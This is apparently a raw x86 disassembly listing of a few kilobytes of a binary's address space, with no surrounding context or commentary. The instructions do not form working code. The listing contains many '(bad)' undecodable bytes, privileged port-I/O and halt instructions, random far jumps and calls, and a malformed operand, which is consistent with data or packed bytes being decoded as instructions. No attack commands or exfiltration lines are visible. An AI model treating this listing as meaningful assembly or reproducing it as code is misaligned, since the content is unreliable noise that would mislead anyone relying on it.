  41d137:	outs   dx,BYTE PTR ds:[esi]
  41d138:	iret   
  41d139:	fimul  WORD PTR [esi+0x4a]
  41d13c:	dec    ebp
  41d13d:	push   edx
  41d13e:	(bad)  
  41d13f:	jl     0x41d0f7
  41d141:	sbb    eax,0x1a1dbc3e
  41d146:	jl     0x41d145
  41d148:	mov    dh,0xef
  41d14a:	pop    edx
  41d14b:	sar    ch,0x22
  41d14e:	adc    al,0x96
  41d150:	loop   0x41d0e0
  41d152:	rcl    BYTE PTR [esi+0x12],0x66
  41d156:	push   ebx
  41d157:	mov    ds:0x4e7c8ae9,al
  41d15c:	es inc ebx
  41d15e:	dec    ebx
  41d15f:	mov    ecx,0xc4f72b83
  41d164:	cwde   
  41d165:	jmp    0xd1e6:0x6593358f
  41d16c:	cmp    eax,ebp
  41d16e:	mov    WORD PTR [ecx+edx*1],ss
  41d171:	and    ebp,esp
  41d173:	inc    ecx
  41d174:	call   0x9550:0x9e49ba6c
  41d17b:	mov    edi,0xbe649fd
  41d180:	jecxz  0x41d1a9
  41d182:	stos   BYTE PTR es:[edi],al
  41d183:	(bad)  
  41d184:	jo     0x41d17f
  41d186:	sbb    eax,0x7eb4b8e0
  41d18b:	(bad)  
  41d18c:	jae    0x41d1f3
  41d18e:	das    
  41d18f:	jle    0x41d1d8
  41d191:	push   ebx
  41d192:	mov    al,0x5f
  41d194:	cmp    al,0x61
  41d196:	ins    DWORD PTR es:[edi],dx
  41d197:	adc    dh,BYTE PTR [edx-0x67e1832f]
  41d19d:	xchg   DWORD PTR [ebx+edi*4+0x6b],eax
  41d1a1:	or     eax,esi
  41d1a3:	pop    eax
  41d1a4:	fisubr WORD PTR [edx-0x63ffb55f]
  41d1aa:	or     BYTE PTR [edi+eiz*1],0x26
  41d1ae:	ss jb  0x41d214
  41d1b1:	icebp  
  41d1b2:	push   esi
  41d1b3:	sti    
  41d1b4:	or     BYTE PTR [esi-0x15f19f2a],0xe7
  41d1bb:	xor    edi,eax
  41d1bd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d1be:	punpcklwd mm1,DWORD PTR [eax]
  41d1c1:	adc    ah,BYTE PTR [ecx+0x24]
  41d1c4:	out    0x46,al
  41d1c6:	cmp    ebx,DWORD PTR [ebx+0x3]
  41d1c9:	and    al,0x35
  41d1cb:	(bad)  
  41d1cc:	aad    0xb7
  41d1ce:	mov    edi,0x39a7164d
  41d1d3:	(bad)  
  41d1d4:	or     esi,DWORD PTR ds:0x2f9bb0dc
  41d1da:	rcl    edx,1
  41d1dc:	sbb    al,0xac
  41d1de:	mov    ecx,0x64b99c29
  41d1e3:	inc    ebp
  41d1e4:	push   edi
  41d1e5:	mov    eax,0xad7bd841
  41d1ea:	adc    ah,BYTE PTR [eax-0x3405c82]
  41d1f0:	leave  
  41d1f1:	mov    ecx,0x724479e9
  41d1f6:	xchg   esp,eax
  41d1f7:	out    dx,al
  41d1f8:	(bad)  
  41d1f9:	cmp    dh,BYTE PTR [edx+0x7b47688f]
  41d1ff:	fwait
  41d200:	mov    esi,edi
  41d202:	into   
  41d203:	in     eax,dx
  41d204:	cmp    BYTE PTR [edi+0x3c048d8f],ah
  41d20a:	cdq    
  41d20b:	pop    ds
  41d20c:	adc    edx,DWORD PTR ds:0x2c2d9a0a
  41d212:	pop    esp
  41d213:	add    cl,BYTE PTR [edx]
  41d215:	push   ebp
  41d216:	inc    edi
  41d217:	inc    esp
  41d218:	mov    WORD PTR [esp+ecx*8+0x3e],ss
  41d21c:	xchg   ebx,eax
  41d21d:	leave  
  41d21e:	push   0x7384836
  41d223:	mov    dl,BYTE PTR [esi]
  41d225:	out    0xf5,eax
  41d227:	test   DWORD PTR [edi-0x319e39e2],edx
  41d22d:	retf   
  41d22e:	pop    ebx
  41d22f:	mov    bl,0x2c
  41d231:	or     ebp,ebx
  41d233:	jo     0x41d26f
  41d235:	jmp    0x2259:0x89ff5c8b
  41d23c:	jae    0x41d28b
  41d23e:	or     BYTE PTR [ecx-0x2e],bh
  41d241:	call   0x7b7d:0x6b2e894d
  41d248:	dec    ecx
  41d249:	jg     0x41d234
  41d24b:	(bad)  
  41d24d:	fldenv [edi-0x493e5225]
  41d253:	aas    
  41d254:	xor    cl,BYTE PTR ds:0x5e0a718f
  41d25a:	test   eax,0x517e4df4
  41d25f:	mov    cl,BYTE PTR [eax+0x59]
  41d262:	jmp    0xc3af:0x8fc00c4c
  41d269:	or     eax,0x61518431
  41d26e:	popf   
  41d26f:	fcmove st,st(1)
  41d271:	xor    cl,BYTE PTR [ebp+0xa]
  41d274:	push   ss
  41d275:	dec    edx
  41d276:	inc    ebp
  41d277:	push   ecx
  41d278:	sub    eax,0xc107daf3
  41d27d:	loop   0x41d2a6
  41d27f:	ror    BYTE PTR [ebx-0x7c],cl
  41d282:	inc    esp
  41d283:	fadd   QWORD PTR [ebx-0x1f65b651]
  41d289:	jne    0x41d2b7
  41d28b:	js     0x41d219
  41d28d:	sahf   
  41d28e:	(bad)  
  41d28f:	fwait
  41d290:	xchg   ecx,eax
  41d291:	call   0x392:0xe9953c6c
  41d298:	das    
  41d299:	sbb    DWORD PTR ds:0x8aaa6dc3,eax
  41d29f:	xchg   DWORD PTR [ebx+0x69],esp
  41d2a2:	dec    ebp
  41d2a3:	xchg   esi,eax
  41d2a4:	sbb    eax,0x65c737ab
  41d2a9:	daa    
  41d2aa:	in     eax,dx
  41d2ab:	push   edx
  41d2ac:	out    0xec,eax
  41d2ae:	fsubrp st(2),st
  41d2b0:	cmp    bl,dl
  41d2b2:	or     eax,0x9b0184e9
  41d2b7:	xor    dl,BYTE PTR ds:0xcf803aa2
  41d2bd:	shl    BYTE PTR ss:[edi],cl
  41d2c0:	and    ah,BYTE PTR [eax]
  41d2c2:	stc    
  41d2c3:	je     0x41d2cf
  41d2c5:	addr16 sahf 
  41d2c7:	ret    0x1ff7
  41d2ca:	ja     0x41d33b
  41d2cc:	push   ebx
  41d2cd:	push   ss
  41d2ce:	loop   0x41d2fa
  41d2d0:	cmp    al,0xfd
  41d2d2:	out    dx,al
  41d2d3:	je     0x41d34e
  41d2d5:	dec    edx
  41d2d6:	xchg   DWORD PTR [ecx-0x73],eax
  41d2d9:	mov    ebx,0xb2664628
  41d2de:	xor    ch,BYTE PTR [ecx-0x72]
  41d2e1:	div    BYTE PTR [ecx]
  41d2e3:	pop    es
  41d2e4:	lods   al,BYTE PTR ds:[esi]
  41d2e5:	pop    eax
  41d2e6:	sub    BYTE PTR [esi+eax*4],ah
  41d2e9:	add    BYTE PTR [edi],cl
  41d2eb:	jle    0x41d283
  41d2ed:	sub    edi,DWORD PTR [ecx+0x24]
  41d2f0:	iret   
  41d2f1:	retf   0xd109
  41d2f4:	mov    eax,0x177659ed
  41d2f9:	in     al,0x5e
  41d2fb:	aam    0xcc
  41d2fd:	inc    ebx
  41d2fe:	arpl   WORD PTR [ebp+0x65],ax
  41d301:	jne    0x41d2e2
  41d303:	xchg   edx,eax
  41d304:	and    BYTE PTR [esi+0x16bf71d],bl
  41d30a:	add    ebx,DWORD PTR gs:[esi-0x25]
  41d30e:	gs cs sub eax,0x9672e0b2
  41d315:	bswap  edi
  41d317:	dec    ebx
  41d318:	aas    
  41d319:	push   ebp
  41d31a:	call   0x69ffc41a
  41d31f:	lods   al,BYTE PTR ds:[esi]
  41d320:	mov    cl,0x7
  41d322:	mov    al,ds:0xba091a7b
  41d327:	xor    DWORD PTR [ecx],0x4c954fdd
  41d32d:	retf   
  41d32e:	cmp    ah,BYTE PTR [esi+0x4e7b6f0e]
  41d334:	mov    edi,ebp
  41d336:	xchg   edx,eax
  41d337:	inc    esi
  41d338:	adc    DWORD PTR [ebx+eiz*2+0x6b],ebx
  41d33c:	and    edx,DWORD PTR [eax]
  41d33e:	inc    edx
  41d33f:	inc    ebx
  41d340:	or     eax,0x7233e6e8
  41d345:	mov    eax,0xac4191ac
  41d34a:	push   cs
  41d34b:	outs   dx,DWORD PTR ds:[esi]
  41d34c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d34d:	hlt    
  41d34e:	test   DWORD PTR [edx-0x52194d4b],eax
  41d354:	test   al,0x3a
  41d356:	aam    0xfe
  41d358:	test   BYTE PTR [edx],al
  41d35a:	sbb    DWORD PTR [edi+0x74],0x25
  41d35e:	xchg   ebx,eax
  41d35f:	call   0xfd52:0x117cd710
  41d366:	lock in eax,0x3e
  41d369:	mov    ch,0x3d
  41d36b:	mov    edi,0xd584322a
  41d370:	mov    ch,0xa3
  41d372:	in     al,dx
  41d373:	in     al,dx
  41d374:	test   ecx,ebp
  41d376:	mov    bh,BYTE PTR [ecx+0x74]
  41d379:	pop    ebp
  41d37a:	dec    ebp
  41d37b:	add    eax,DWORD PTR [ebx-0x74]
  41d37e:	std    
  41d37f:	pop    eax
  41d380:	clc    
  41d381:	or     dl,dl
  41d383:	add    ebx,ebx
  41d385:	or     DWORD PTR [edx+0x4f],ebp
  41d388:	out    dx,eax
  41d389:	scas   eax,DWORD PTR es:[edi]
  41d38a:	lods   eax,DWORD PTR ds:[esi]
  41d38b:	pop    es
  41d38c:	xchg   edi,eax
  41d38d:	dec    ecx
  41d38e:	pop    es
  41d38f:	or     al,0x8a
  41d391:	jno    0x41d36d
  41d393:	mov    BYTE PTR [ebx-0x6],dl
  41d396:	leave  
  41d397:	icebp  
  41d398:	push   ss
  41d399:	ret    0xd77f
  41d39c:	fwait
  41d39d:	aam    0xd0
  41d39f:	jle    0x41d39b
  41d3a1:	push   0x5e722d4b
  41d3a6:	mov    bh,0x23
  41d3a8:	add    al,bh
  41d3aa:	jg     0x41d3db
  41d3ac:	mov    ecx,DWORD PTR [ecx]
  41d3ae:	push   cs
  41d3af:	jnp    0x41d3e6
  41d3b1:	shl    BYTE PTR [esp+ebp*8+0x23197bbb],cl
  41d3b8:	or     al,0x3b
  41d3ba:	clc    
  41d3bb:	xchg   ebp,eax
  41d3bc:	scas   eax,DWORD PTR es:[edi]
  41d3bd:	add    ebx,DWORD PTR [eax+0x22]
  41d3c0:	lods   al,BYTE PTR ds:[esi]
  41d3c1:	push   edi
  41d3c2:	aam    0x12
  41d3c4:	scas   al,BYTE PTR es:[edi]
  41d3c5:	push   0xffffffed
  41d3c7:	pusha  
  41d3c8:	dec    ecx
  41d3c9:	fisub  DWORD PTR [ecx+0x51]
  41d3cc:	scas   eax,DWORD PTR es:[edi]
  41d3cd:	push   ecx
  41d3ce:	ret    0x86cf
  41d3d1:	xchg   BYTE PTR [edx+eiz*1+0x1a],dh
  41d3d5:	sahf   
  41d3d6:	adc    edx,DWORD PTR [ebx-0x1f]
  41d3d9:	icebp  
  41d3da:	or     DWORD PTR [esi-0xd5752],ecx
  41d3e0:	and    eax,DWORD PTR ds:0xd214f6bd
  41d3e6:	mov    eax,ds:0x70abf432
  41d3eb:	aam    0x46
  41d3ed:	push   ss
  41d3ee:	jp     0x41d399
  41d3f0:	shl    BYTE PTR [ebx],cl
  41d3f2:	bound  ebp,QWORD PTR [ebx+edx*8]
  41d3f5:	mov    ebp,0x2afb0e1f
  41d3fa:	stc    
  41d3fb:	pop    esi
  41d3fc:	pop    ebp
  41d3fd:	mov    ds:0xd3457c9a,eax
  41d402:	add    eax,0xedbb81b
  41d407:	fnstcw WORD PTR [ebp-0x3c4e2c2a]
  41d40d:	loope  0x41d3bc
  41d40f:	sbb    BYTE PTR ds:0xaf2f4df2,dh
  41d415:	jmp    0x41d410
  41d417:	xor    al,0x80
  41d419:	cli    
  41d41a:	(bad)  
  41d41b:	(bad)  
  41d41c:	into   
  41d41d:	push   esi
  41d41e:	prefetch BYTE PTR [esp+ecx*4-0x22]
  41d423:	daa    
  41d424:	dec    edi
  41d425:	push   eax
  41d426:	push   edx
  41d427:	adc    ebp,DWORD PTR [esi-0x3cb07be5]
  41d42d:	arpl   WORD PTR [edi],di
  41d42f:	fs inc ebx
  41d431:	or     dh,BYTE PTR [ebx-0x4b]
  41d434:	mov    ds:0x19e1ccec,eax
  41d439:	mov    ?,ebp
  41d43b:	imul   ebx,edi,0xbb57c97f
  41d441:	adc    BYTE PTR [esi+eiz*4],al
  41d444:	mov    al,ds:0x4fb6a883
  41d449:	sub    DWORD PTR [edx],0xf
  41d44c:	inc    eax
  41d44d:	xchg   ebx,eax
  41d44e:	or     di,si
  41d451:	mov    eax,0x54f82449
  41d456:	gs xchg edx,eax
  41d458:	mov    eax,ds:0x92e4a03
  41d45d:	hlt    
  41d45e:	inc    edi
  41d45f:	hlt    
  41d460:	in     al,dx
  41d461:	rol    DWORD PTR [ecx+edx*1-0x51a730c5],cl
  41d468:	inc    bp
  41d46a:	imul   ecx,DWORD PTR [esi+eax*4+0x49352d8e],0x51da19c
  41d475:	cmc    
  41d476:	inc    ecx
  41d477:	inc    ebx
  41d478:	fst    QWORD PTR [edx*1-0x4d0f469e]
  41d47f:	pop    es
  41d480:	loope  0x41d40e
  41d482:	bound  edi,QWORD PTR [edx]
  41d484:	sub    BYTE PTR [esp+eiz*2-0x482d9cda],ah
  41d48b:	mov    WORD PTR [eax],ds
  41d48d:	jnp    0x41d455
  41d48f:	cmp    eax,DWORD PTR [ebp+0x7f84a8c2]
  41d495:	lock pop es
  41d497:	jae    0x41d45d
  41d499:	gs and eax,0x2ae8e978
  41d49f:	or     al,ah
  41d4a1:	fstp   TBYTE PTR [ebp+0x16]
  41d4a4:	retf   0xa999
  41d4a7:	pop    eax
  41d4a8:	inc    ecx
  41d4a9:	dec    ebx
  41d4aa:	dec    edx
  41d4ab:	cwde   
  41d4ac:	mov    bh,0x77
  41d4ae:	sahf   
  41d4af:	adc    al,0xe0
  41d4b1:	or     DWORD PTR [esi],edx
  41d4b3:	cli    
  41d4b4:	sub    cl,BYTE PTR [ebp+0x15917308]
  41d4ba:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d4bb:	jns    0x41d4e2
  41d4bd:	adc    BYTE PTR es:[ebx+esi*4-0x74],bh
  41d4c2:	ins    BYTE PTR es:[edi],dx
  41d4c3:	xchg   edi,eax
  41d4c4:	dec    esp
  41d4c5:	loope  0x41d539
  41d4c7:	mov    dh,0x6
  41d4c9:	sub    bl,BYTE PTR [edi]
  41d4cb:	push   ecx
  41d4cc:	js     0x41d4c7
  41d4ce:	gs popa 
  41d4d0:	addr16 push es
  41d4d2:	jae    0x41d45a
  41d4d4:	mov    ebx,0x36486d54
  41d4d9:	rcr    BYTE PTR [edi+edi*8-0xfe7a4d9],1
  41d4e0:	cmp    BYTE PTR [ecx-0x7e3facc2],al
  41d4e6:	cmp    eax,0x5e0f217e
  41d4eb:	(bad)  
  41d4ec:	add    BYTE PTR es:[ecx+0x10febc8],cl
  41d4f3:	jge    0x41d4df
  41d4f5:	jb     0x41d4e6
  41d4f7:	pop    es
  41d4f8:	xor    dl,BYTE PTR [ecx+0x6b7465ed]
  41d4fe:	mov    bl,0x83
  41d500:	imul   ch
  41d502:	enter  0xfb5c,0x59
  41d506:	xor    BYTE PTR [ecx+0x14],ch
  41d509:	mov    cl,0x42
  41d50b:	(bad)  
  41d50c:	mov    edi,0x11780c34
  41d511:	mov    eax,ds:0x5c634f1
  41d516:	stc    
  41d517:	dec    edi
  41d518:	xchg   ecx,eax
  41d519:	pop    edx
  41d51a:	xor    BYTE PTR [esi],al
  41d51c:	test   eax,0xf20adef1
  41d521:	fild   DWORD PTR [edx+0x22]
  41d524:	gs xor eax,0xe989eab5
  41d52a:	mov    ecx,0x802e07de
  41d52f:	(bad)  
  41d530:	cmp    edx,DWORD PTR [ebx]
  41d532:	call   0xe943c662
  41d537:	push   ebx
  41d538:	or     DWORD PTR [eax-0x4cbee850],0xffffff93
  41d53f:	pop    es
  41d540:	ficomp DWORD PTR [eax-0x63177a71]
  41d546:	sub    DWORD PTR [ecx+0x20efdda1],0xf08776f9
  41d550:	in     eax,0x17
  41d552:	push   edx
  41d553:	daa    
  41d554:	aam    0x56
  41d556:	pop    edx
  41d557:	addr16 mov dl,0x32
  41d55a:	enter  0x7545,0x6d
  41d55e:	stos   BYTE PTR es:[edi],al
  41d55f:	imul   eax,DWORD PTR es:[edi+ecx*1+0x3d],0x84250d8e
  41d568:	mov    eax,ds:0x9e6f148
  41d56d:	mov    ebp,0x53e0c533
  41d572:	int3   
  41d573:	in     al,0x95
  41d575:	xor    BYTE PTR [ebx-0x29],bh
  41d578:	adc    BYTE PTR [esi+0x6c],ah
  41d57b:	jg     0x41d527
  41d57d:	fs mul eax
  41d580:	fsubp  st(0),st
  41d582:	dec    esp
  41d583:	add    al,0x9
  41d585:	dec    esp
  41d586:	lods   eax,DWORD PTR ds:[esi]
  41d587:	jl     0x41d5d7
  41d589:	cwde   
  41d58a:	inc    ebx
  41d58b:	pop    eax
  41d58c:	out    0xec,al
  41d58e:	ins    DWORD PTR es:[edi],dx
  41d58f:	pop    edx
  41d590:	outs   dx,BYTE PTR ds:[esi]
  41d591:	xor    esp,ecx
  41d593:	or     eax,0xd93661e6
  41d598:	sub    DWORD PTR [edx+0x7d73abc7],ebp
  41d59e:	inc    edi
  41d59f:	xlat   BYTE PTR ds:[ebx]
  41d5a0:	or     edi,DWORD PTR [ebp+0x30]
  41d5a3:	inc    esi
  41d5a4:	mov    cl,0x83
  41d5a6:	scas   eax,DWORD PTR es:[edi]
  41d5a7:	and    DWORD PTR [ebp*2-0xb6cd803],ecx
  41d5ae:	inc    eax
  41d5af:	jno    0x41d5fe
  41d5b1:	out    dx,eax
  41d5b2:	div    edx
  41d5b4:	dec    edx
  41d5b5:	jp     0x41d60d
  41d5b7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d5b8:	stos   BYTE PTR es:[edi],al
  41d5b9:	mov    eax,0xbb29d639
  41d5be:	jno    0x41d5c4
  41d5c0:	adc    DWORD PTR [ebp+0xe],0x39
  41d5c4:	pop    esi
  41d5c5:	mov    bl,0x85
  41d5c7:	xchg   edx,eax
  41d5c8:	call   0x6b9f:0xf3e14df1
  41d5cf:	cld    
  41d5d0:	je     0x41d5d0
  41d5d2:	push   cs
  41d5d3:	std    
  41d5d4:	pop    es
  41d5d5:	pop    esp
  41d5d6:	enter  0x2216,0x38
  41d5da:	jne    0x41d635
  41d5dc:	xor    al,0xa3
  41d5de:	mov    cs,WORD PTR [edx+0x1e508f56]
  41d5e4:	test   DWORD PTR [ebp-0x3954615b],esp
  41d5ea:	dec    edi
  41d5eb:	inc    esi
  41d5ec:	adc    BYTE PTR [eax-0x4d2dd3ea],cl
  41d5f2:	pop    ss
  41d5f3:	push   ss
  41d5f4:	lods   eax,DWORD PTR ds:[esi]
  41d5f5:	ficom  DWORD PTR [edx+0x37138586]
  41d5fb:	pop    ecx
  41d5fc:	sbb    eax,0xe617e7ae
  41d601:	shl    BYTE PTR [ecx],cl
  41d603:	clc    
  41d604:	dec    esi
  41d605:	pop    ds
  41d606:	adc    al,0x38
  41d608:	pop    ecx
  41d609:	dec    eax
  41d60a:	cs mov ch,0x98
  41d60d:	(bad)  
  41d60e:	(bad)  
  41d60f:	inc    edi
  41d610:	in     al,dx
  41d611:	scas   eax,DWORD PTR es:[edi]
  41d612:	icebp  
  41d613:	pmullw mm3,QWORD PTR [esi]
  41d616:	mov    bl,0x3c
  41d618:	popa   
  41d619:	xchg   ebx,eax
  41d61a:	cmp    dh,ch
  41d61c:	sbb    edx,esi
  41d61e:	fwait
  41d61f:	push   0x1e
  41d621:	aas    
  41d622:	sbb    al,0x13
  41d624:	sahf   
  41d625:	xchg   ebx,eax
  41d626:	outs   dx,BYTE PTR ds:[esi]
  41d627:	ja     0x41d64b
  41d629:	popa   
  41d62a:	pop    eax
  41d62b:	and    edx,ecx
  41d62d:	cmp    DWORD PTR [ecx+eax*2+0x2],edi
  41d631:	cs cs (bad) 
  41d634:	hlt    
  41d635:	mov    eax,DWORD PTR [edi+0x634f59a8]
  41d63b:	cld    
  41d63c:	sub    eax,0x210e7a84
  41d641:	ins    BYTE PTR es:[edi],dx
  41d642:	rcl    DWORD PTR [eax-0x2401c024],0xdf
  41d649:	(bad)  
  41d64a:	daa    
  41d64b:	out    dx,eax
  41d64c:	mov    eax,ds:0x6fd64393
  41d651:	xchg   ecx,eax
  41d652:	aad    0x1
  41d654:	(bad)  
  41d655:	arpl   WORD PTR [edx-0x3a],dx
  41d658:	and    DWORD PTR [esi-0x44e48721],edx
  41d65e:	or     eax,DWORD PTR [ebx]
  41d660:	mov    DWORD PTR [eax+ecx*2],esp
  41d663:	nop
  41d664:	xor    esp,DWORD PTR [esi+edx*8+0x10]
  41d668:	lea    edi,[edi+edx*2-0x7b]
  41d66c:	ss daa 
  41d66e:	mov    al,0x22
  41d670:	fimul  DWORD PTR [eax+esi*8+0x60b52d8c]
  41d677:	stos   BYTE PTR es:[edi],al
  41d678:	inc    BYTE PTR [ebp+0x6e99a2ac]
  41d67e:	bound  edi,QWORD PTR [eax]
  41d680:	lods   eax,DWORD PTR ds:[esi]
  41d681:	dec    ebx
  41d682:	pusha  
  41d683:	cmp    dl,ah
  41d685:	sub    eax,0xaa6027c
  41d68a:	aas    
  41d68b:	lock pop esi
  41d68d:	scas   eax,DWORD PTR es:[edi]
  41d68e:	ffree  st(6)
  41d690:	mov    eax,DWORD PTR [eax-0x10156657]
  41d696:	fwait
  41d697:	cdq    
  41d698:	adc    ecx,DWORD PTR [ebx+0x47]
  41d69b:	sub    DWORD PTR [edi-0x7c],edi
  41d69e:	dec    edx
  41d69f:	push   es
  41d6a0:	(bad)  
  41d6a1:	neg    DWORD PTR [edi*4-0x4b5d5112]
  41d6a8:	mov    dl,0x72
  41d6aa:	enter  0x351d,0x95
  41d6ae:	dec    esp
  41d6af:	sbb    eax,0x4e2bd035
  41d6b4:	sub    DWORD PTR [ecx-0x214b73b3],eax
  41d6ba:	addr16 (bad) 
  41d6bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d6bd:	mov    esp,0x80325359
  41d6c2:	and    DWORD PTR [edi+0x6e],ecx
  41d6c5:	(bad)  
  41d6c6:	jmp    0xb738:0x3ebbb4e6
  41d6cd:	pop    ecx
  41d6ce:	jge    0x41d69f
  41d6d0:	jp     0x41d724
  41d6d2:	cwde   
  41d6d3:	pop    eax
  41d6d4:	cli    
  41d6d5:	pop    esp
  41d6d6:	cwde   
  41d6d7:	lea    ebp,[esi-0x6c]
  41d6da:	ss xor eax,0xf1cbb7c1
  41d6e0:	js     0x41d71b
  41d6e2:	cmp    ebp,DWORD PTR [eax]
  41d6e4:	push   esp
  41d6e5:	ja     0x41d6ff
  41d6e7:	mov    ebx,0xecf447d4
  41d6ec:	dec    ebp
  41d6ed:	jo     0x41d6c3
  41d6ef:	sbb    eax,0x4d7acb4
  41d6f4:	push   0xab1b18c8
  41d6f9:	loop   0x41d742
  41d6fb:	sbb    eax,0x271be8b5
  41d700:	cmc    
  41d701:	add    BYTE PTR [edi-0x56e12841],ch
  41d707:	jg     0x41d6cf
  41d709:	fnstcw WORD PTR [edx+ebp*2]
  41d70c:	jmp    0x1fe6:0x8f8b27a4
  41d713:	icebp  
  41d714:	pusha  
  41d715:	xchg   ebp,eax
  41d716:	xchg   ecx,eax
  41d717:	imul   esi,DWORD PTR [eax-0x9],0x7f
  41d71b:	and    al,0x50
  41d71d:	xchg   ah,ch
  41d71f:	adc    dh,dl
  41d721:	add    DWORD PTR es:[edi+ebx*1+0x6c907a4d],ebx
  41d729:	imul   esi,esp,0x6a
  41d72c:	ret    
  41d72d:	inc    edi
  41d72e:	mov    ebp,0x16517461
  41d733:	cmp    al,BYTE PTR [ebx+0x728fc9f2]
  41d739:	xchg   ecx,eax
  41d73a:	xor    DWORD PTR [edi],esp
  41d73c:	pop    ss
  41d73d:	shl    bl,1
  41d73f:	repnz push ds
  41d741:	lock jnp 0x41d735
  41d744:	test   eax,0x5f627c72
  41d749:	int3   
  41d74a:	jmp    DWORD PTR [esi+eiz*4-0x6d]
  41d74e:	or     dh,dl
  41d750:	inc    esp
  41d751:	lods   eax,DWORD PTR ds:[esi]
  41d752:	push   edx
  41d753:	push   ebp
  41d754:	int    0x6e
  41d756:	jp     0x41d7b0
  41d758:	push   ebx
  41d759:	mov    dh,0x27
  41d75b:	es into 
  41d75d:	xchg   ebx,eax
  41d75e:	out    0x6d,eax
  41d760:	cmp    BYTE PTR [ebx-0x4e],0x26
  41d764:	sub    DWORD PTR [esi+0x7d],esp
  41d767:	cmp    eax,DWORD PTR [ebx-0x13]
  41d76a:	inc    ecx
  41d76b:	jbe    0x41d7cd
  41d76d:	xor    ch,dh
  41d76f:	loopne 0x41d783
  41d771:	ret    0x42e5
  41d774:	in     eax,0x39
  41d776:	and    al,dh
  41d778:	jp     0x41d732
  41d77a:	aam    0xfb
  41d77c:	or     esi,DWORD PTR [eax+ebx*8-0x77f0046e]
  41d783:	test   BYTE PTR [ebx+edi*8],0x8f
  41d787:	mov    ah,0xa6
  41d789:	dec    ecx
  41d78a:	retf   0x5a5a
  41d78d:	push   esp
  41d78e:	scas   eax,DWORD PTR es:[edi]
  41d78f:	xor    ecx,DWORD PTR [edx]
  41d791:	sub    edi,ecx
  41d793:	push   edx
  41d794:	sub    esi,ebx
  41d796:	adc    BYTE PTR [edi-0x65674e90],dh
  41d79c:	dec    eax
  41d79d:	loop   0x41d7b0
  41d79f:	sub    eax,0x7f92070e
  41d7a4:	jne    0x41d79c
  41d7a6:	dec    edi
  41d7a7:	sub    DWORD PTR [ecx-0x1a],eax
  41d7aa:	std    
  41d7ab:	xor    BYTE PTR [ecx+ebp*1],0x54
  41d7af:	test   ebp,edi
  41d7b1:	jbe    0x41d799
  41d7b3:	jmp    0xe6562905
  41d7b8:	aaa    
  41d7b9:	cmp    al,0xb1
  41d7bb:	outs   dx,DWORD PTR ds:[esi]
  41d7bc:	mov    ebx,DWORD PTR es:[ebp+0x43bab8d]
  41d7c3:	add    cl,BYTE PTR [eax-0x40864ced]
  41d7c9:	(bad)  
  41d7ca:	retf   
  41d7cb:	pop    esi
  41d7cc:	arpl   WORD PTR [edi+0x38],ax
  41d7cf:	cs pop edx
  41d7d1:	addr16 dec ebp
  41d7d3:	mov    edi,0xc1958d0b
  41d7d8:	into   
  41d7d9:	dec    ecx
  41d7da:	jb     0x41d80e
  41d7dc:	in     eax,dx
  41d7dd:	icebp  
  41d7de:	pusha  
  41d7df:	sbb    ch,BYTE PTR [ecx+edx*1-0x3e]
  41d7e3:	ins    BYTE PTR es:[edi],dx
  41d7e4:	xor    ah,BYTE PTR [esi-0x60]
  41d7e7:	add    eax,0xb97ca89f
  41d7ec:	(bad)  
  41d7ed:	aaa    
  41d7ee:	std    
  41d7ef:	repz sbb esp,DWORD PTR [ebp+0x6d]
  41d7f3:	sbb    DWORD PTR [esi-0x5c4f59e5],edx
  41d7f9:	push   esi
  41d7fa:	xchg   edi,eax
  41d7fb:	leave  
  41d7fc:	imul   esp,ebp,0xffffff8e
  41d7ff:	repz or BYTE PTR [ebx],0xfb
  41d803:	fld    DWORD PTR [ecx+0x73]
  41d806:	xchg   ebp,eax
  41d807:	jmp    0xc8d2:0x679cd504
  41d80e:	push   ss
  41d80f:	mov    ds:0x5092714d,eax
  41d814:	leave  
  41d815:	sti    
  41d816:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d817:	adc    bh,cl
  41d819:	imul   ebx,DWORD PTR [ebx-0x15ef84ec],0xffffff92
  41d820:	dec    ebp
  41d821:	adc    ebx,DWORD PTR [edi+ecx*4]
  41d824:	add    DWORD PTR [esp+esi*1-0x22],esi
  41d828:	rcl    BYTE PTR [ecx-0x5ffa16b7],1
  41d82e:	stc    
  41d82f:	inc    eax
  41d830:	jmp    0x41d7f2
  41d832:	mov    BYTE PTR [ebp+0x3cfa55e5],dl
  41d838:	adc    DWORD PTR [edx],eax
  41d83a:	inc    ebx
  41d83b:	dec    eax
  41d83c:	sub    ebp,eax
  41d83e:	dec    eax
  41d83f:	push   edi
  41d840:	test   ch,0xf0
  41d843:	test   DWORD PTR [ebp+0x44ecc8c],edi
  41d849:	push   ds
  41d84a:	mov    al,0xc5
  41d84c:	pop    ss
  41d84d:	or     DWORD PTR [esi+ecx*4-0x37],0x462cc6c
  41d855:	cli    
  41d856:	loop   0x41d864
  41d858:	cdq    
  41d859:	xchg   edx,eax
  41d85a:	sub    esi,edx
  41d85c:	inc    ebx
  41d85d:	mov    al,ds:0xbef0ed3f
  41d862:	add    ecx,ebx
  41d864:	int    0xfc
  41d866:	out    0x8,al
  41d868:	adc    eax,0x2e663bf4
  41d86d:	in     al,0xe7
  41d86f:	cs ret 
  41d871:	inc    eax
  41d872:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d873:	or     eax,0xb8b33824
  41d878:	cli    
  41d879:	daa    
  41d87a:	jbe    0x41d820
  41d87c:	cwde   
  41d87d:	add    eax,0xfe646ef1
  41d882:	(bad)  
  41d883:	rcr    BYTE PTR [eax+0x71723397],cl
  41d889:	sub    bl,cl
  41d88b:	test   al,0xc9
  41d88d:	stc    
  41d88e:	aas    
  41d88f:	push   cs
  41d890:	jmp    FWORD PTR [edi+0x7b]
  41d893:	outs   dx,DWORD PTR ds:[esi]
  41d894:	cs loopne 0x41d8ac
  41d897:	std    
  41d898:	xor    al,0x7b
  41d89a:	enter  0x65d2,0x55
  41d89e:	mov    ds:0xd141069,al
  41d8a3:	pushaw 
  41d8a5:	(bad)  [ecx+eax*1+0x1d]
  41d8a9:	icebp  
  41d8aa:	cmp    DWORD PTR ds:0x9d976262,esp
  41d8b0:	loop   0x41d8a4
  41d8b2:	popf   
  41d8b3:	push   edx
  41d8b4:	sub    al,0x4b
  41d8b6:	jo     0x41d928
  41d8b8:	mov    bl,0xd0
